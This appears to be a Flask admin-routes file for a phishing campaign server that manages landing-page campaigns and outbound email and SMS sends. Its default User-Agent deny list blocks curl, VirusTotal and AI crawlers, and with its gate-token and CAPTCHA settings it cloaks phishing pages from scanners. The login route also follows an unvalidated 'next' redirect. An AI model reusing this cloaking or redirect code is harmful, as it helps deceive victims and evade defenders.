"""
Admin interface routes
"""
from flask import Blueprint, render_template, request, jsonify, redirect, url_for, flash, Response, session
from flask_login import login_user, logout_user, login_required, current_user
from shared.auth import authenticate_user, get_current_user
from shared.database import Campaign, User, Event, Template, Plugin
from shared.database import db
from api.services.plugin_service import PluginService
from shared.caddy import caddy_manager, CaddySSLError, CaddyAPIError
from shared.campaign_validation import validate_campaign_for_activation
import logging
import uuid
from datetime import datetime

logger = logging.getLogger(__name__)

admin_bp = Blueprint('admin', __name__, 
                    template_folder='templates',
                    static_folder='static')

@admin_bp.before_request
def check_password_reset_required():
    """Check if password reset is required and block access if needed"""
    # Skip check for login and logout routes
    if request.endpoint in ['admin.login', 'admin.logout']:
        return

    # Only check for authenticated users
    if current_user.is_authenticated:
        # Ensure session expires after PERMANENT_SESSION_LIFETIME
        session.permanent = True
        # Refresh user from database to get latest password_reset_required status
        from shared.database import User
        user = User.query.get(current_user.id)
        if user and user.password_reset_required:
            # Allow API password change endpoint
            if request.path.startswith('/api/users/change-password'):
                return
            
            # Block all other routes - return JSON for API, redirect for pages
            if request.path.startswith('/api/'):
                return jsonify({
                    'error': 'Password reset required',
                    'password_reset_required': True
                }), 403
            else:
                # For page routes, we'll let the modal handle it (don't redirect to avoid loops)
                # The modal will be shown by the frontend
                pass

@admin_bp.route('/login', methods=['GET', 'POST'])
def login():
    """Login page"""
    if current_user.is_authenticated:
        return redirect(url_for('admin.dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            flash('Username and password are required', 'error')
            return render_template('login.html')
        
        user = authenticate_user(username, password)
        if user:
            login_user(user)
            
            # Check if password reset is required
            if user.password_reset_required:
                flash('Please change your password to continue', 'warning')
            else:
                flash(f'Welcome back, {user.username}!', 'success')
            
            # Redirect to next page or dashboard (modal will handle password reset if needed)
            next_page = request.args.get('next')
            return redirect(next_page) if next_page else redirect(url_for('admin.dashboard'))
        else:
            flash('Invalid username or password', 'error')

    session.permanent = True
    return render_template('login.html')

@admin_bp.route('/logout')
@login_required
def logout():
    """Logout"""
    logout_user()
    flash('You have been logged out', 'info')
    return redirect(url_for('admin.login'))


@admin_bp.after_request
def add_no_cache_headers(response):
    """Prevent back-forward cache so back button after logout doesn't show stale page."""
    if request.endpoint != 'admin.login':
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
    return response


@admin_bp.route('/')
@login_required
def dashboard():
    """Admin dashboard"""
    try:
        # Get dashboard stats
        total_campaigns = Campaign.query.count()
        active_campaigns = Campaign.query.filter_by(status='active').count()
        draft_campaigns = Campaign.query.filter_by(status='draft').count()
        
        recent_campaigns = Campaign.query.order_by(
            Campaign.created_at.desc()
        ).limit(5).all()
        
        return render_template('dashboard.html',
                             total_campaigns=total_campaigns,
                             active_campaigns=active_campaigns,
                             draft_campaigns=draft_campaigns,
                             recent_campaigns=recent_campaigns)
    except Exception as e:
        logger.exception("Error loading dashboard")
        flash(f'Error loading dashboard: {e}', 'error')
        return render_template('dashboard.html')


@admin_bp.route('/campaigns')
@login_required
def campaigns():
    """Campaign management page"""
    try:
        page = request.args.get('page', 1, type=int)
        campaigns = Campaign.query.filter(
            Campaign.status != 'deleted'
        ).order_by(
            Campaign.created_at.desc()
        ).paginate(
            page=page, per_page=10, error_out=False
        )
        return render_template('campaigns.html', campaigns=campaigns)
    except Exception as e:
        logger.exception("Error loading campaigns")
        flash(f'Error loading campaigns: {e}', 'error')
        return render_template('campaigns.html', campaigns=None)

@admin_bp.route('/campaigns/new')
@login_required
def new_campaign():
    """New campaign page"""
    from shared.database import Workflow
    # Get workflows that support GET or POST
    get_workflows = Workflow.query.filter(
        Workflow.workflow_type == 'campaign',
        Workflow.http_method.in_(['GET', 'BOTH']),
        Workflow.is_active == True
    ).all()
    post_workflows = Workflow.query.filter(
        Workflow.workflow_type == 'campaign',
        Workflow.http_method.in_(['POST', 'BOTH']),
        Workflow.is_active == True
    ).all()
    # Workflows for outbound campaigns: only 'sending' type
    outbound_workflows = Workflow.query.filter(
        Workflow.workflow_type == 'sending',
        Workflow.is_active == True
    ).order_by(Workflow.name).all()
    return render_template('campaign_form.html', 
                         campaign=None, 
                         get_workflows=get_workflows,
                         post_workflows=post_workflows,
                         outbound_workflows=outbound_workflows)

@admin_bp.route('/campaigns/<int:campaign_id>')
@login_required
def campaign_detail(campaign_id):
    """Campaign detail page"""
    try:
        from shared.config import Config
        config = Config()
        campaign = Campaign.query.get_or_404(campaign_id)
        
        # Build phishing server URL for campaign access
        phishing_host = config.PHISHING_HOST
        phishing_port = config.PHISHING_PORT
        
        # Use localhost/127.0.0.1 for display if server binds to 0.0.0.0
        if phishing_host == '0.0.0.0':
            display_host = '127.0.0.1'
        else:
            display_host = phishing_host
        
        phishing_url = f"http://{display_host}:{phishing_port}"
        
        outbound_emails_sent = 0
        outbound_emails_failed = 0
        outbound_sms_sent = 0
        outbound_sms_failed = 0
        sending_workflow = None
        if campaign.campaign_type == 'outbound':
            from shared.database import EmailJob, SendingWorkflow, SmsJob
            outbound_emails_sent = db.session.query(EmailJob).join(SendingWorkflow).filter(
                SendingWorkflow.campaign_id == campaign.id,
                EmailJob.status == 'sent'
            ).count()
            outbound_emails_failed = db.session.query(EmailJob).join(SendingWorkflow).filter(
                SendingWorkflow.campaign_id == campaign.id,
                EmailJob.status == 'failed'
            ).count()
            outbound_sms_sent = SmsJob.query.filter_by(campaign_id=campaign.id, status='sent').count()
            outbound_sms_failed = SmsJob.query.filter_by(campaign_id=campaign.id, status='failed').count()
            # Get-or-create single SendingWorkflow for this outbound campaign (linked via post_workflow_id)
            if campaign.post_workflow_id:
                sw = SendingWorkflow.query.filter_by(campaign_id=campaign.id).first()
                if sw is None:
                    sw = SendingWorkflow(
                        name=(campaign.name or 'Campaign') + ' send',
                        campaign_id=campaign.id,
                        workflow_id=campaign.post_workflow_id
                    )
                    db.session.add(sw)
                    db.session.commit()
                else:
                    if sw.workflow_id != campaign.post_workflow_id:
                        sw.workflow_id = campaign.post_workflow_id
                        db.session.commit()
                sending_workflow = sw
        
        return render_template('campaign_detail.html',
                             campaign=campaign,
                             phishing_url=phishing_url,
                             outbound_emails_sent=outbound_emails_sent,
                             outbound_emails_failed=outbound_emails_failed,
                             outbound_sms_sent=outbound_sms_sent,
                             outbound_sms_failed=outbound_sms_failed,
                             sending_workflow=sending_workflow)
    except Exception as e:
        logger.exception(f"Error loading campaign {campaign_id}")
        flash(f'Error loading campaign: {e}', 'error')
        return redirect(url_for('admin.campaigns'))

@admin_bp.route('/campaigns/<int:campaign_id>/edit')
@login_required
def edit_campaign(campaign_id):
    """Edit campaign page"""
    try:
        from shared.database import Workflow
        campaign = Campaign.query.get_or_404(campaign_id)
        # Get workflows that support GET or POST
        get_workflows = Workflow.query.filter(
            Workflow.workflow_type == 'campaign',
            Workflow.http_method.in_(['GET', 'BOTH']),
            Workflow.is_active == True
        ).all()
        post_workflows = Workflow.query.filter(
            Workflow.workflow_type == 'campaign',
            Workflow.http_method.in_(['POST', 'BOTH']),
            Workflow.is_active == True
        ).all()
        # Workflows for outbound campaigns: only 'sending' type
        outbound_workflows = Workflow.query.filter(
            Workflow.workflow_type == 'sending',
            Workflow.is_active == True
        ).order_by(Workflow.name).all()
        return render_template('campaign_form.html', 
                             campaign=campaign, 
                             get_workflows=get_workflows,
                             post_workflows=post_workflows,
                             outbound_workflows=outbound_workflows)
    except Exception as e:
        logger.exception(f"Error loading campaign {campaign_id} for editing")
        flash(f'Error loading campaign: {e}', 'error')
        return redirect(url_for('admin.campaigns'))

@admin_bp.route('/campaigns', methods=['POST'])
@login_required
def create_campaign():
    """Create new campaign"""
    try:
        # Get form data
        name = request.form.get('name', '').strip()
        description = request.form.get('description', '').strip()
        campaign_type = request.form.get('campaign_type', 'inbound').strip()
        get_workflow_id = request.form.get('get_workflow_id', type=int)
        post_workflow_id = request.form.get('post_workflow_id', type=int)
        uid = request.form.get('uid', '').strip()
        template_source = request.form.get('template_source', 'existing')
        template_id = request.form.get('template_id', type=int)
        custom_html = request.form.get('custom_html', '').strip()
        status = request.form.get('status', 'draft')
        variables_json = request.form.get('variables', '{}')
        
        # Validation
        if not name:
            return jsonify({'success': False, 'error': 'Campaign name is required'})
        
        if campaign_type not in ('inbound', 'outbound'):
            return jsonify({'success': False, 'error': "campaign_type must be 'inbound' or 'outbound'"})
        
        # Type-specific validation
        if campaign_type == 'inbound':
            if not get_workflow_id and not post_workflow_id:
                return jsonify({'success': False, 'error': 'Inbound campaigns require at least one workflow (GET or POST)'})
            
            # Validate workflows exist and have correct http_method for inbound campaigns
            from shared.database import Workflow
            if get_workflow_id:
                get_workflow = Workflow.query.get(get_workflow_id)
                if not get_workflow:
                    return jsonify({'success': False, 'error': f'GET workflow {get_workflow_id} not found'})
                if get_workflow.http_method not in ('GET', 'BOTH'):
                    return jsonify({'success': False, 'error': f'Workflow {get_workflow_id} does not support GET requests'})
            
            if post_workflow_id:
                post_workflow = Workflow.query.get(post_workflow_id)
                if not post_workflow:
                    return jsonify({'success': False, 'error': f'POST workflow {post_workflow_id} not found'})
                if post_workflow.http_method not in ('POST', 'BOTH'):
                    return jsonify({'success': False, 'error': f'Workflow {post_workflow_id} does not support POST requests'})
        else:
            # For outbound campaigns, validate single workflow exists (skip HTTP method validation)
            from shared.database import Workflow
            if post_workflow_id:
                post_workflow = Workflow.query.get(post_workflow_id)
                if not post_workflow:
                    return jsonify({'success': False, 'error': f'Workflow {post_workflow_id} not found'})
            # Outbound campaigns should not have get_workflow_id
            if get_workflow_id:
                return jsonify({'success': False, 'error': 'Outbound campaigns can only have one workflow (use the Workflow field, not GET/POST workflows)'})
        
        # Parse variables JSON
        try:
            import json
            variables = json.loads(variables_json) if variables_json else {}
        except json.JSONDecodeError:
            return jsonify({'success': False, 'error': 'Invalid JSON in variables field'})
        
        # UID handling - only for inbound campaigns
        if campaign_type == 'inbound':
            if not uid:
                uid = str(uuid.uuid4())[:8]
            
            # Check if UID is unique
            existing_campaign = Campaign.query.filter_by(uid=uid).first()
            if existing_campaign:
                return jsonify({'success': False, 'error': 'Campaign UID already exists'})
        else:
            uid = None  # Outbound campaigns don't need UID
        
        # Get template HTML
        template_html = None
        template_id_to_save = None
        if template_source == 'workflow_defined' and campaign_type == 'inbound':
            template_html = None
            template_id_to_save = None
        elif template_source == 'existing' and template_id:
            template = Template.query.get(template_id)
            if template:
                template_html = template.template_html
                template_id_to_save = template_id
            else:
                return jsonify({'success': False, 'error': 'Selected template not found'})
        elif template_source == 'custom':
            template_html = custom_html
            template_id_to_save = None
        else:
            template_html = ''
            template_id_to_save = None
        
        # Template validation - required for inbound unless workflow_defined
        if campaign_type == 'inbound' and template_source != 'workflow_defined' and not template_html:
            return jsonify({'success': False, 'error': 'Template HTML is required for inbound campaigns'})
        
        # For outbound campaigns, template_html can be None (workflows will generate content)
        # Don't set default empty HTML - allow it to be None
        
        # Build configuration (only infrastructure-level settings)
        config = {
            'require_https': request.form.get('require_https') == 'on',
            'enable_rate_limiting': request.form.get('enable_rate_limiting') == 'on',
        }
        
        # Extract SSL configuration from form (only for inbound campaigns)
        ssl_mode = None
        custom_domain = None
        ua_filter_enabled = False
        ua_deny_list = []
        ua_blocked_template_id = None
        gate_enabled = False
        gate_token = None
        gate_param_name = 'rid'
        gate_mode = 'template'
        gate_redirect_url = None
        gate_template_id = None

        if campaign_type == 'inbound':
            ssl_mode = request.form.get('ssl_mode', 'automatic')
            custom_domain = request.form.get('custom_domain')

            # User-Agent filtering configuration
            ua_filter_enabled = request.form.get('ua_filter_enabled') == 'on'
            ua_deny_list_text = request.form.get('ua_deny_list', '').strip()
            if ua_deny_list_text:
                # Parse deny list from textarea (one per line)
                ua_deny_list = [line.strip() for line in ua_deny_list_text.split('\n') if line.strip()]
            else:
                # Use default deny list
                ua_deny_list = ['curl', 'virustotal', 'gpt', 'claude', 'anthropic', 'openai', 'chatgpt', 'bard', 'gemini', 'perplexity', 'copilot', 'bing', 'crawler', 'bot', 'spider', 'scraper']

            ua_blocked_template_id = request.form.get('ua_blocked_template_id', type=int)

            # Validate UA filter configuration
            if ua_filter_enabled and not ua_blocked_template_id:
                return jsonify({'success': False, 'error': 'Blocked template is required when User-Agent filtering is enabled'})

            # Gate token configuration
            gate_enabled = request.form.get('gate_enabled') == 'on'
            gate_token = (request.form.get('gate_token') or '').strip() or None
            gate_param_name = (request.form.get('gate_param_name') or 'rid').strip()
            gate_mode = request.form.get('gate_mode', 'template')
            gate_redirect_url = (request.form.get('gate_redirect_url') or '').strip() or None
            gate_template_id = request.form.get('gate_template_id', type=int)

            if gate_enabled:
                if gate_mode == 'template' and not gate_template_id:
                    return jsonify({'success': False, 'error': 'Gate template is required when gate mode is "template"'})
                if gate_mode == 'redirect' and not gate_redirect_url:
                    return jsonify({'success': False, 'error': 'Redirect URL is required when gate mode is "redirect"'})

            # CAPTCHA configuration (campaign-level gate)
            captcha_enabled = request.form.get('captcha_enabled') == 'on'
            captcha_template_id = request.form.get('captcha_template_id', type=int)
            captcha_site_key = (request.form.get('captcha_site_key') or '').strip()
            captcha_secret_key = (request.form.get('captcha_secret_key') or '').strip()
            if captcha_enabled:
                if not captcha_template_id or not captcha_site_key or not captcha_secret_key:
                    return jsonify({'success': False, 'error': 'CAPTCHA requires a template and both Turnstile site key and secret key'})
                config['captcha_site_key'] = captcha_site_key
                config['captcha_secret_key'] = captcha_secret_key
            else:
                captcha_enabled = False
                captcha_template_id = None

            # Custom 404 page configuration
            custom_404_mode = request.form.get('custom_404_mode', 'default')
            if custom_404_mode == 'body':
                config['custom_404_body'] = (request.form.get('custom_404_body_text') or '').strip()
            elif custom_404_mode == 'template':
                config['custom_404_template_id'] = request.form.get('custom_404_template_id', type=int) or None
        else:
            captcha_enabled = False
            captcha_template_id = None
        
        # Create campaign
        campaign = Campaign(
            name=name,
            description=description,
            campaign_type=campaign_type,
            uid=uid,
            get_workflow_id=get_workflow_id if campaign_type == 'inbound' else None,
            post_workflow_id=post_workflow_id,
            variables=variables,
            template_id=template_id_to_save,
            template_html=template_html,
            config=config,
            status=status,
            ssl_mode=ssl_mode,
            custom_domain=custom_domain,
            created_by_id=current_user.id
        )
        
        # Set UA filter fields if columns exist (after migration)
        if hasattr(Campaign, 'ua_filter_enabled'):
            campaign.ua_filter_enabled = ua_filter_enabled
            campaign.ua_deny_list = ua_deny_list
            campaign.ua_blocked_template_id = ua_blocked_template_id

        # Set gate token fields (inbound only)
        if hasattr(Campaign, 'gate_enabled'):
            campaign.gate_enabled = gate_enabled if campaign_type == 'inbound' else False
            campaign.gate_token = gate_token
            campaign.gate_param_name = gate_param_name
            campaign.gate_mode = gate_mode
            campaign.gate_redirect_url = gate_redirect_url
            campaign.gate_template_id = gate_template_id if campaign_type == 'inbound' else None

        # Set CAPTCHA fields (campaign-level gate, inbound only)
        if hasattr(Campaign, 'captcha_enabled'):
            campaign.captcha_enabled = captcha_enabled if campaign_type == 'inbound' else False
            campaign.captcha_template_id = captcha_template_id if campaign_type == 'inbound' else None

        # Handle SSL certificate uploads if custom mode (only for inbound)
        if campaign_type == 'inbound' and ssl_mode == 'custom':
            ssl_cert = request.files.get('ssl_certificate')
            ssl_key = request.files.get('ssl_private_key')
            ssl_ca = request.files.get('ssl_ca_chain')
            
            if ssl_cert and ssl_key:
                try:
                    cert_data = ssl_cert.read()
                    key_data = ssl_key.read()
                    ca_data = ssl_ca.read() if ssl_ca else None
                    
                    # Validate SSL certificate
                    validation_result = caddy_manager.validate_ssl_certificate(
                        cert_data, key_data, custom_domain
                    )
                    
                    if not validation_result['valid']:
                        return jsonify({
                            'success': False,
                            'error': 'SSL certificate validation failed',
                            'validation_errors': [validation_result.get('error', 'Invalid certificate')]
                        })
                    
                    # Store SSL files
                    ssl_files = caddy_manager.store_ssl_files(
                        campaign.uid, cert_data, key_data, ca_data
                    )
                    
                    campaign.ssl_cert_path = ssl_files['cert_path']
                    campaign.ssl_key_path = ssl_files['key_path']
                    campaign.ssl_ca_path = ssl_files['ca_path']
                    
                except CaddySSLError as e:
                    return jsonify({
                        'success': False,
                        'error': f'SSL certificate error: {str(e)}'
                    })
            else:
                return jsonify({
                    'success': False,
                    'error': 'SSL certificate and private key files are required for custom SSL mode'
                })
        
        db.session.add(campaign)
        db.session.commit()
        
        logger.info(f"Campaign '{name}' created by user {current_user.username}")
        
        return jsonify({
            'success': True, 
            'campaign_id': campaign.id,
            'message': f'Campaign "{name}" created successfully'
        })
        
    except Exception as e:
        db.session.rollback()
        logger.exception("Error creating campaign")
        return jsonify({'success': False, 'error': f'Error creating campaign: {str(e)}'})

@admin_bp.route('/campaigns/<int:campaign_id>', methods=['PUT'])
@login_required
def update_campaign(campaign_id):
    """Update existing campaign"""
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        
        # Get form data
        name = request.form.get('name', '').strip()
        description = request.form.get('description', '').strip()
        campaign_type = request.form.get('campaign_type', campaign.campaign_type).strip()
        
        # Get workflow IDs - handle both inbound and outbound
        outbound_workflow_id = request.form.get('outbound_workflow_id', type=int)
        if campaign_type == 'outbound':
            # Outbound: use outbound_workflow_id
            get_workflow_id = None  # Outbound campaigns only use one workflow
            post_workflow_id = outbound_workflow_id
        else:
            # Inbound: use get_workflow_id and post_workflow_id
            get_workflow_id = request.form.get('get_workflow_id', type=int)
            post_workflow_id = request.form.get('post_workflow_id', type=int)
        
        uid = request.form.get('uid', '').strip()
        template_source = request.form.get('template_source', 'existing')
        template_id = request.form.get('template_id', type=int)
        custom_html = request.form.get('custom_html', '').strip()
        status = request.form.get('status', campaign.status)
        variables_json = request.form.get('variables', '{}')
        
        # Validation
        if not name:
            return jsonify({'success': False, 'error': 'Campaign name is required'})
        
        if campaign_type not in ('inbound', 'outbound'):
            return jsonify({'success': False, 'error': "campaign_type must be 'inbound' or 'outbound'"})
        
        # Check if changing type from inbound to outbound with Caddy config
        if campaign.campaign_type == 'inbound' and campaign_type == 'outbound' and campaign.caddy_config_id:
            return jsonify({'success': False, 'error': 'Cannot change inbound campaign to outbound: Caddy configuration exists. Remove Caddy config first.'})
        
        # Type-specific validation
        if campaign_type == 'inbound':
            # Validate workflows if provided
            from shared.database import Workflow
            if get_workflow_id is not None:
                get_workflow = Workflow.query.get(get_workflow_id)
                if not get_workflow:
                    return jsonify({'success': False, 'error': f'GET workflow {get_workflow_id} not found'})
                if get_workflow.http_method not in ('GET', 'BOTH'):
                    return jsonify({'success': False, 'error': f'Workflow {get_workflow_id} does not support GET requests'})
            
            if post_workflow_id is not None:
                post_workflow = Workflow.query.get(post_workflow_id)
                if not post_workflow:
                    return jsonify({'success': False, 'error': f'POST workflow {post_workflow_id} not found'})
                if post_workflow.http_method not in ('POST', 'BOTH'):
                    return jsonify({'success': False, 'error': f'Workflow {post_workflow_id} does not support POST requests'})
        else:
            # For outbound campaigns, validate single workflow exists (skip HTTP method validation)
            from shared.database import Workflow
            if post_workflow_id is not None:
                post_workflow = Workflow.query.get(post_workflow_id)
                if not post_workflow:
                    return jsonify({'success': False, 'error': f'Workflow {post_workflow_id} not found'})
            # Outbound campaigns should not have get_workflow_id
            if get_workflow_id is not None:
                return jsonify({'success': False, 'error': 'Outbound campaigns can only have one workflow (use the Workflow field, not GET/POST workflows)'})
        
        # Parse variables JSON
        try:
            import json
            variables = json.loads(variables_json) if variables_json else {}
        except json.JSONDecodeError:
            return jsonify({'success': False, 'error': 'Invalid JSON in variables field'})
        
        # UID handling - only for inbound campaigns
        if campaign_type == 'inbound':
            if not uid:
                return jsonify({'success': False, 'error': 'Campaign UID is required for inbound campaigns'})
            
            # Check if UID is unique (excluding current campaign)
            existing_campaign = Campaign.query.filter(
                Campaign.uid == uid, 
                Campaign.id != campaign_id
            ).first()
            if existing_campaign:
                return jsonify({'success': False, 'error': 'Campaign UID already exists'})
        else:
            uid = None  # Clear UID for outbound campaigns
        
        # Get template HTML
        template_html = campaign.template_html  # Keep existing if not changed
        template_id_to_save = campaign.template_id
        if template_source == 'workflow_defined' and campaign_type == 'inbound':
            template_html = None
            template_id_to_save = None
        elif template_source == 'existing' and template_id:
            template = Template.query.get(template_id)
            if template:
                template_html = template.template_html
                template_id_to_save = template_id
            else:
                return jsonify({'success': False, 'error': 'Selected template not found'})
        elif template_source == 'custom' and custom_html:
            template_html = custom_html
            template_id_to_save = None
        elif template_source == 'custom' and not custom_html and campaign_type == 'outbound':
            # For outbound campaigns, allow template_html to be None
            template_html = None
            template_id_to_save = None
        
        # Template validation - required for inbound unless workflow_defined
        if campaign_type == 'inbound' and template_source != 'workflow_defined' and not template_html:
            return jsonify({'success': False, 'error': 'Template HTML is required for inbound campaigns'})
        
        # Update configuration (only infrastructure-level settings)
        config = campaign.config or {}
        config.update({
            'require_https': request.form.get('require_https') == 'on',
            'enable_rate_limiting': request.form.get('enable_rate_limiting') == 'on',
        })
        
        # Extract SSL configuration from form (only for inbound campaigns)
        ssl_mode = None
        custom_domain = None
        ua_filter_enabled = False
        ua_deny_list = []
        ua_blocked_template_id = None
        gate_enabled = False
        gate_token = getattr(campaign, 'gate_token', None)
        gate_param_name = getattr(campaign, 'gate_param_name', 'rid') or 'rid'
        gate_mode = getattr(campaign, 'gate_mode', 'template') or 'template'
        gate_redirect_url = getattr(campaign, 'gate_redirect_url', None)
        gate_template_id = getattr(campaign, 'gate_template_id', None)

        if campaign_type == 'inbound':
            ssl_mode = request.form.get('ssl_mode', campaign.ssl_mode or 'automatic')
            custom_domain = request.form.get('custom_domain') or campaign.custom_domain

            # User-Agent filtering configuration
            ua_filter_enabled = request.form.get('ua_filter_enabled') == 'on'
            ua_deny_list_text = request.form.get('ua_deny_list', '').strip()
            if ua_deny_list_text:
                # Parse deny list from textarea (one per line)
                ua_deny_list = [line.strip() for line in ua_deny_list_text.split('\n') if line.strip()]
            elif not (hasattr(campaign, 'ua_deny_list') and campaign.ua_deny_list):
                # Use default deny list if not set
                ua_deny_list = ['curl', 'virustotal', 'gpt', 'claude', 'anthropic', 'openai', 'chatgpt', 'bard', 'gemini', 'perplexity', 'copilot', 'bing', 'crawler', 'bot', 'spider', 'scraper']
            else:
                ua_deny_list = campaign.ua_deny_list if hasattr(campaign, 'ua_deny_list') else []

            ua_blocked_template_id = request.form.get('ua_blocked_template_id', type=int)

            # Validate UA filter configuration
            if ua_filter_enabled and not ua_blocked_template_id:
                return jsonify({'success': False, 'error': 'Blocked template is required when User-Agent filtering is enabled'})

            # Gate token configuration
            gate_enabled = request.form.get('gate_enabled') == 'on'
            gate_token = (request.form.get('gate_token') or '').strip() or getattr(campaign, 'gate_token', None)
            gate_param_name = (request.form.get('gate_param_name') or 'rid').strip()
            gate_mode = request.form.get('gate_mode', 'template')
            gate_redirect_url = (request.form.get('gate_redirect_url') or '').strip() or None
            gate_template_id = request.form.get('gate_template_id', type=int)

            if gate_enabled:
                if gate_mode == 'template' and not gate_template_id:
                    return jsonify({'success': False, 'error': 'Gate template is required when gate mode is "template"'})
                if gate_mode == 'redirect' and not gate_redirect_url:
                    return jsonify({'success': False, 'error': 'Redirect URL is required when gate mode is "redirect"'})

            # CAPTCHA configuration (campaign-level gate)
            captcha_enabled = request.form.get('captcha_enabled') == 'on'
            captcha_template_id = request.form.get('captcha_template_id', type=int)
            captcha_site_key = (request.form.get('captcha_site_key') or '').strip()
            captcha_secret_key = (request.form.get('captcha_secret_key') or '').strip()
            if captcha_enabled:
                if not captcha_template_id or not captcha_site_key or not captcha_secret_key:
                    return jsonify({'success': False, 'error': 'CAPTCHA requires a template and both Turnstile site key and secret key'})
                config['captcha_site_key'] = captcha_site_key
                config['captcha_secret_key'] = captcha_secret_key
            else:
                config.pop('captcha_site_key', None)
                config.pop('captcha_secret_key', None)
                captcha_template_id = None

            # Custom 404 page configuration
            custom_404_mode = request.form.get('custom_404_mode', 'default')
            if custom_404_mode == 'default':
                config.pop('custom_404_body', None)
                config.pop('custom_404_template_id', None)
            elif custom_404_mode == 'body':
                config['custom_404_body'] = (request.form.get('custom_404_body_text') or '').strip()
                config.pop('custom_404_template_id', None)
            elif custom_404_mode == 'template':
                config['custom_404_template_id'] = request.form.get('custom_404_template_id', type=int) or None
                config.pop('custom_404_body', None)
        else:
            # Clear UA filter settings for outbound campaigns
            config.pop('custom_404_body', None)
            config.pop('custom_404_template_id', None)
            ua_filter_enabled = False
            ua_deny_list = []
            ua_blocked_template_id = None
            gate_enabled = False
            captcha_enabled = False
            captcha_template_id = None
        
        # Update campaign
        campaign.name = name
        campaign.description = description
        campaign.campaign_type = campaign_type
        campaign.uid = uid
        # Update workflows based on campaign type
        if campaign_type == 'inbound':
            # Inbound campaigns can have both GET and POST workflows
            # Always update both fields (None means clear/optional)
            campaign.get_workflow_id = get_workflow_id
            campaign.post_workflow_id = post_workflow_id
        else:
            # Outbound campaigns only have one workflow (stored in post_workflow_id)
            campaign.get_workflow_id = None  # Always clear GET workflow for outbound
            campaign.post_workflow_id = post_workflow_id  # Can be None
        if variables_json:
            campaign.variables = variables
        campaign.template_id = template_id_to_save
        campaign.template_html = template_html
        campaign.config = config
        campaign.status = status
        campaign.ssl_mode = ssl_mode
        campaign.custom_domain = custom_domain
        
        # Set UA filter fields if columns exist (after migration)
        if hasattr(Campaign, 'ua_filter_enabled'):
            campaign.ua_filter_enabled = ua_filter_enabled
            campaign.ua_deny_list = ua_deny_list
            campaign.ua_blocked_template_id = ua_blocked_template_id

        # Set gate token fields (inbound only)
        if hasattr(Campaign, 'gate_enabled'):
            campaign.gate_enabled = gate_enabled if campaign_type == 'inbound' else False
            campaign.gate_token = gate_token
            campaign.gate_param_name = gate_param_name
            campaign.gate_mode = gate_mode
            campaign.gate_redirect_url = gate_redirect_url
            campaign.gate_template_id = gate_template_id if campaign_type == 'inbound' else None

        # Set CAPTCHA fields (campaign-level gate, inbound only)
        if hasattr(Campaign, 'captcha_enabled'):
            campaign.captcha_enabled = captcha_enabled if campaign_type == 'inbound' else False
            campaign.captcha_template_id = captcha_template_id if campaign_type == 'inbound' else None

        if campaign_type == 'outbound':
            campaign.caddy_config_id = None  # Clear Caddy config for outbound
        campaign.updated_at = datetime.utcnow()

        db.session.commit()

        logger.info(f"Campaign '{name}' updated by user {current_user.username}")
        
        return jsonify({
            'success': True,
            'campaign_id': campaign.id,
            'message': f'Campaign "{name}" updated successfully'
        })
        
    except Exception as e:
        db.session.rollback()
        logger.exception(f"Error updating campaign {campaign_id}")
        return jsonify({'success': False, 'error': f'Error updating campaign: {str(e)}'})

@admin_bp.route('/campaigns/<int:campaign_id>/toggle', methods=['POST'])
@login_required
def toggle_campaign_status(campaign_id):
    """Toggle campaign status with validation"""
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        
        data = request.get_json()
        new_status = data.get('status')
        
        if new_status not in ['active', 'paused', 'draft', 'completed']:
            return jsonify({'success': False, 'error': 'Invalid status'})
        
        # Store old status before changing it
        old_status = campaign.status
        
        # Validate campaign before activation
        if new_status == 'active':
            validation_errors = validate_campaign_for_activation(campaign)
            if validation_errors:
                return jsonify({
                    'success': False, 
                    'error': 'Campaign validation failed',
                    'validation_errors': validation_errors
                })
            
            # Set status and flush BEFORE deploy so _build_servers_from_db sees this campaign
            campaign.status = new_status
            campaign.updated_at = datetime.utcnow()
            db.session.flush()
            
            # Handle SSL certificate generation/deployment for Caddy (inbound only)
            # Note: Caddy errors are non-fatal for testing/development
            if campaign.campaign_type == 'inbound':
                try:
                    if campaign.ssl_mode == 'self_signed' and campaign.custom_domain:
                        # Generate self-signed certificate
                        ssl_files = caddy_manager.generate_self_signed_certificate(
                            campaign.uid, 
                            campaign.custom_domain
                        )
                        campaign.ssl_cert_path = ssl_files['cert_path']
                        campaign.ssl_key_path = ssl_files['key_path']
                    
                    # Deploy Caddy configuration
                    caddy_manager.deploy_campaign_config(campaign)
                    campaign.caddy_config_id = f"campaign_{campaign.uid}"
                    
                except CaddySSLError as e:
                    # SSL errors are more critical - log but allow activation
                    logger.warning(f"Caddy SSL error for campaign {campaign.uid}: {e}")
                    logger.warning("Campaign will be activated but SSL configuration may be incomplete")
                except CaddyAPIError as e:
                    # API errors are non-fatal - Caddy may not be running
                    logger.warning(f"Caddy API error for campaign {campaign.uid}: {e}")
                    logger.warning("Campaign will be activated but Caddy configuration was not deployed")
                    logger.warning("Start Caddy with: ./start.sh --with-caddy or docker-compose -f docker-compose.caddy.yml up -d")
        
        elif new_status in ['paused', 'completed'] and old_status == 'active':
            # Set status BEFORE remove so _build_servers_from_db excludes this campaign
            campaign.status = new_status
            campaign.updated_at = datetime.utcnow()
            # Remove Caddy configuration when deactivating (inbound only)
            if campaign.campaign_type == 'inbound':
                try:
                    caddy_manager.remove_campaign_config(campaign.uid)
                    campaign.caddy_config_id = None
                except Exception as e:
                    logger.warning(f"Failed to remove Caddy config for campaign {campaign.uid}: {e}")
        else:
            campaign.status = new_status
            campaign.updated_at = datetime.utcnow()
        
        db.session.commit()
        
        logger.info(f"Campaign '{campaign.name}' status changed from {old_status} to {new_status} by {current_user.username}")
        
        return jsonify({
            'success': True,
            'message': f'Campaign status updated to {new_status}',
            'old_status': old_status,
            'new_status': new_status
        })
        
    except Exception as e:
        db.session.rollback()
        logger.exception(f"Error toggling campaign {campaign_id} status")
        return jsonify({'success': False, 'error': f'Error updating status: {str(e)}'})

@admin_bp.route('/campaigns/<int:campaign_id>', methods=['DELETE'])
@login_required
def delete_campaign(campaign_id):
    """Delete campaign"""
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        campaign_name = campaign.name

        # Remove Caddy configuration and cleanup files before DB delete (inbound only)
        if campaign.campaign_type == 'inbound':
